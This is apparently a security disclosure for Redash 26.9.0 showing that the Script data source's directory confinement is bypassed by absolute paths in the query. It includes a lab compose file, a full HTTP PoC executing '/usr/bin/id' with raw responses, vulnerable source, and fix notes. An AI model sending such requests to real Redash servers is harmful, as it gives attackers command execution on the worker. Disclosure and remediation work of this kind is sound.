### Vulnerability details

**Official website / Product:** https://redash.io / https://github.com/getredash/redash

**Repository:** getredash/redash (stars at selection: 28859)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** 26.9.0 (Docker image `redash/redash:26.9.0`; also present on current master `4e62d1100070e2a8e87074b9e0a600b6f0d1f097`). Topology: `server`/`scheduler`/`worker` (`redash/redash:26.9.0`) + `postgres:15-alpine` + `redis:7-alpine` + `maildev/maildev`; host **24302→5000**.

**Vulnerability URL / Parameter:** `POST /api/query_results` — JSON field `query` against an `insecure_script` data source whose `path` is a fixed directory (not `*`)

**Complex:** yes

### Verification procedure

1. Lab recreate. Save the following compose as `docker-compose.yml` in any working directory:

```yaml
# Host: http://127.0.0.1:24302  |  image redash/redash:26.9.0 + postgres:15-alpine + redis:7-alpine + maildev/maildev
# Setup admin: admin@example.com / Admin123!  (org LabOrg)
# After up: docker compose run --rm server create_db  (once, before/alongside first boot)
services:
  server:
    image: redash/redash:26.9.0
    command: server
    depends_on:
      - postgres
      - redis
    ports:
      - "24302:5000"
    environment:
      PYTHONUNBUFFERED: "0"
      REDASH_LOG_LEVEL: "INFO"
      REDASH_REDIS_URL: "redis://redis:6379/0"
      REDASH_DATABASE_URL: "postgresql://postgres@postgres/postgres"
      REDASH_COOKIE_SECRET: "r63a2-cookie-secret-change-me"
      REDASH_SECRET_KEY: "r63a2-secret-key-change-me"
      REDASH_RATELIMIT_ENABLED: "false"
      REDASH_MAIL_DEFAULT_SENDER: "redash@example.com"
      REDASH_MAIL_SERVER: "email"
      REDASH_MAIL_PORT: "1025"
      REDASH_HOST: "http://127.0.0.1:24302"
      REDASH_ADDITIONAL_QUERY_RUNNERS: "redash.query_runner.python,redash.query_runner.script"
    restart: unless-stopped
  scheduler:
    image: redash/redash:26.9.0
    command: scheduler
    depends_on:
      - server
    environment:
      REDASH_REDIS_URL: "redis://redis:6379/0"
      REDASH_DATABASE_URL: "postgresql://postgres@postgres/postgres"
      REDASH_COOKIE_SECRET: "r63a2-cookie-secret-change-me"
      REDASH_SECRET_KEY: "r63a2-secret-key-change-me"
  worker:
    image: redash/redash:26.9.0
    command: worker
    depends_on:
      - server
    environment:
      PYTHONUNBUFFERED: "0"
      REDASH_REDIS_URL: "redis://redis:6379/0"
      REDASH_DATABASE_URL: "postgresql://postgres@postgres/postgres"
      REDASH_COOKIE_SECRET: "r63a2-cookie-secret-change-me"
      REDASH_SECRET_KEY: "r63a2-secret-key-change-me"
      REDASH_ADDITIONAL_QUERY_RUNNERS: "redash.query_runner.python,redash.query_runner.script"
    restart: unless-stopped
  redis:
    image: redis:7-alpine
    restart: unless-stopped
  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_HOST_AUTH_METHOD: "trust"
    volumes:
      - redash_postgres:/var/lib/postgresql/data
    restart: unless-stopped
  email:
    image: maildev/maildev
    restart: unless-stopped
volumes:
  redash_postgres:
```

   Then:

   - `docker compose up -d postgres redis email`
   - First boot: `docker compose run --rm server create_db`
   - `docker compose up -d`, wait until `http://127.0.0.1:24302/setup` returns 200.
   - Compose already sets `REDASH_ADDITIONAL_QUERY_RUNNERS=redash.query_runner.python,redash.query_runner.script` (Script is **not** in the default enabled list and must be added).

2. Bootstrap admin: open `/setup` with `name=Admin`, `email=admin@example.com`, `password=Admin123!`, `org_name=LabOrg`. Log in with the same credentials; read the user `api_key` from `GET /api/users/1` (session cookie required). Capture used `SWG46zXNFIUbnhK3gL7fPJJIb4Mf0H0JUzQbCwyz` — regenerate and substitute after recreate.

3. As admin, create a Script data source: `POST /api/data_sources` with JSON `{"name":"script1","type":"insecure_script","options":{"path":"/tmp/redash-scripts","shell":false}}` (intended confinement to that directory). Captured DS id was `5` (replace `data_source_id` in the PoC if different). Optional: `docker compose exec worker sh -c 'mkdir -p /tmp/redash-scripts'` (absolute-path bypass does not require the directory to exist).

4. With `Authorization: Key <api_key>` (optionally plus login `csrf_token`/`session` cookies), `POST /api/query_results` with `query` set to an absolute binary path such as `/usr/bin/id`, `data_source_id` of the Script DS, and `max_age=0`.

5. Async result fetch: POST returns a `job` (`status=1`); poll `GET /api/jobs/<job_id>` until `status=3`, then `GET /api/query_results/<query_result_id>`. The hex-encoded `data` decodes to `uid=1000(redash) gid=1000(redash) groups=1000(redash)`, proving arbitrary binary execution outside the configured scripts directory.

### Complete vulnerability PoC

Complete HTTP request (Docker-verified query submit; replace `Authorization` / Cookie / `data_source_id` after lab recreate):

```http
POST /api/query_results HTTP/1.1
Host: 127.0.0.1:24302
Authorization: Key SWG46zXNFIUbnhK3gL7fPJJIb4Mf0H0JUzQbCwyz
Content-Type: application/json
Accept: application/json
Cookie: csrf_token=IjlkM2VjNzQyZjUwMzVmNzUyNzMwZDYxMTY2MDZhODgzMGI3MTI4MDki.aui7OQ.dfCos8HSln9BklqsJ_ZflGUPCD4; session=.eJw9z0tqBDEMBNC7eJ2AJMv6zGUGuy2RENIJ3T2rIXePIZB1UcWrZ7nnEedbuV3HI17K_X2WWxmzcUfr6MPqMKhuGyHrCEhSFga3EBDsQ7e0XoVcm3Crqa5kwKRVaRAZ0gBOR3HpmrmmVp4t2HQgzklAQT64q0aYQEtLLwvyHcdn32O__mmPM44_H76mtK0m88wNBag6Y2bLgJoxAuda2M4j79fXR-yr4bPGpkzZoLbUtnwwBVHWi25WYSgut5efX8XqS8g.aui7OQ.BjFkcVdMNikvge_44yTTsHBc_jM
Content-Length: 54

{"query":"/usr/bin/id","data_source_id":5,"max_age":0}
```

Immediate POST response (job enqueued):

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 02 Nov 2026 16:39:20 GMT
Connection: close
Content-Type: application/json
Content-Length: 139
X-Frame-Options: deny
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval'; font-src 'self' data:; img-src 'self' http: https: data: blob:; object-src 'none'; frame-ancestors 'none'; frame-src redash.io;
X-Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval'; font-src 'self' data:; img-src 'self' http: https: data: blob:; object-src 'none'; frame-ancestors 'none'; frame-src redash.io;
Referrer-Policy: strict-origin-when-cross-origin
Vary: Cookie

{"job": {"id": "76e20c09-5d82-4920-bf49-6b4cf22526c4", "updated_at": 0, "status": 1, "error": "", "result": null, "query_result_id": null}}
```

Job after poll completes:

```json
{"job": {"id": "76e20c09-5d82-4920-bf49-6b4cf22526c4", "updated_at": 0, "status": 3, "error": "", "result": 11, "query_result_id": 11}}
```

Complete HTTP response (`GET /api/query_results/11` raw Docker-lab response):

```http
HTTP/1.1 200 OK
Server: gunicorn
Date: Mon, 02 Nov 2026 16:39:21 GMT
Connection: close
Content-Type: application/json
Content-Length: 318
Cache-Control: private,max-age=31557600
Content-Disposition: attachment; filename=11_2026_11_02.json
X-Frame-Options: deny
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval'; font-src 'self' data:; img-src 'self' http: https: data: blob:; object-src 'none'; frame-ancestors 'none'; frame-src redash.io;
X-Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-eval'; font-src 'self' data:; img-src 'self' http: https: data: blob:; object-src 'none'; frame-ancestors 'none'; frame-src redash.io;
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: csrf_token=IjlkM2VjNzQyZjUwMzVmNzUyNzMwZDYxMTY2MDZhODgzMGI3MTI4MDki.aui8uQ.-_hCkggsq5DO-npe4DLw8w5RWXw; Path=/
Vary: Cookie
Set-Cookie: session=.eJw9z0tqBDEMBNC7eJ2AJMv6zGUGuy2RENIJ3T2rIXePIZB1UcWrZ7nnEedbuV3HI17K_X2WWxmzcUfr6MPqMKhuGyHrCEhSFga3EBDsQ7e0XoVcm3Crqa5kwKRVaRAZ0gBOR3HpmrmmVp4t2HQgzklAQT64q0aYQEtLLwvyHcdn32O__mmPM44_H76mtK0m88wNBmp6Y2bLgJoxAuda2M4j79fXR-yr4bPGpkzZoLbUtnwwBVHWi25WYSgut5efX8XqS8g.aui8uQ.zG_H91gHKoWvMOKAJVyP5umzf5U; Expires=Mon, 02 Nov 2026 22:39:21 GMT; HttpOnly; Path=/

{"query_result": {"id": 11, "query_hash": "3cb81670c29064442d4edb23526d9687", "query": "/usr/bin/id", "data": "7569643d313030302872656461736829206769643d3130303028726564617368292067726f7570733d313030302872656461736829", "data_source_id": 5, "runtime": 0.002016305923461914, "retrieved_at": "2026-11-02T16:39:20.335Z"}}
```

Verification result notes:

Hex field `data` decodes to:

```
uid=1000(redash) gid=1000(redash) groups=1000(redash)
```

The worker executed `/usr/bin/id` despite Script DS `path=/tmp/redash-scripts`. Equivalent payloads such as `/bin/sh -c id` also succeed (`os.path.join` discards the prefix when the query token is absolute; argv is taken from `os.path.join(path, query).split(" ")`).

### Vulnerability analysis

The Script query runner (`type=insecure_script`) documents a "Scripts path" intended to confine execution to one directory when `path != "*"`. Initialization only rejects configured paths containing the substring `../` (incomplete denylist) and never validates the **query**. `query_to_script_path()` builds the executable with `os.path.join(path, query.split(" ")[0])`. Per Python semantics, if the second argument is absolute, `os.path.join` returns that absolute path and drops `path`. Existence check and `subprocess.check_output` then run the attacker-chosen binary with attacker-controlled arguments on the Redash worker.

Prerequisite: Script runner must be enabled via `REDASH_ADDITIONAL_QUERY_RUNNERS` (not default) and an admin must create the data source. Users with execute access to that DS obtain RCE on the worker. This is an unexpected bypass of the path-confinement control (distinct from the known `path=*` design that intentionally runs arbitrary shell commands; Issue #7684 covers only `path=*`).

Trigger / sink source (full path and line numbers):

```python
# File: redash/query_runner/script.py
# Lines: 7-77
def query_to_script_path(path, query):
    if path != "*":
        script = os.path.join(path, query.split(" ")[0])
        if not os.path.exists(script):
            raise IOError("Script '{}' not found in script directory".format(query))

        return os.path.join(path, query).split(" ")

    return query


def run_script(script, shell):
    output = subprocess.check_output(script, shell=shell)
    if output is None:
        return None, "Error reading output"

    output = output.strip()
    if not output:
        return None, "Empty output from script"

    return output, None


class Script(BaseQueryRunner):
    should_annotate_query = False

    @classmethod
    def enabled(cls):
        return "check_output" in subprocess.__dict__

    @classmethod
    def configuration_schema(cls):
        return {
            "type": "object",
            "properties": {
                "path": {"type": "string", "title": "Scripts path"},
                "shell": {
                    "type": "boolean",
                    "title": "Execute command through the shell",
                },
            },
            "required": ["path"],
        }

    @classmethod
    def type(cls):
        return "insecure_script"

    def __init__(self, configuration):
        super(Script, self).__init__(configuration)

        path = self.configuration.get("path", "")
        # If path is * allow any execution path
        if path == "*":
            return

        # Poor man's protection against running scripts from outside the scripts directory
        if path.find("../") > -1:
            raise ValueError("Scripts can only be run from the configured scripts directory")

    def test_connection(self):
        pass

    def run_query(self, query, user):
        try:
            script = query_to_script_path(self.configuration["path"], query)
            return run_script(script, self.configuration["shell"])
        except IOError as e:
            return None, str(e)
        except subprocess.CalledProcessError as e:
            return None, str(e)
```

### Fix notes

- Resolve the executable with `os.path.realpath` under the configured scripts root; reject results that escape the root (`os.path.commonpath`).
- Reject query tokens that are absolute or contain `..` path segments before join.
- Prefer an allowlist of script basenames; avoid passing attacker-controlled argv arrays to `subprocess` when `shell=false` still permits absolute binaries.
- Consider keeping Script disabled by default (already the case) and documenting that any enabled Script DS is fully trusted — or remove the false sense of confinement.
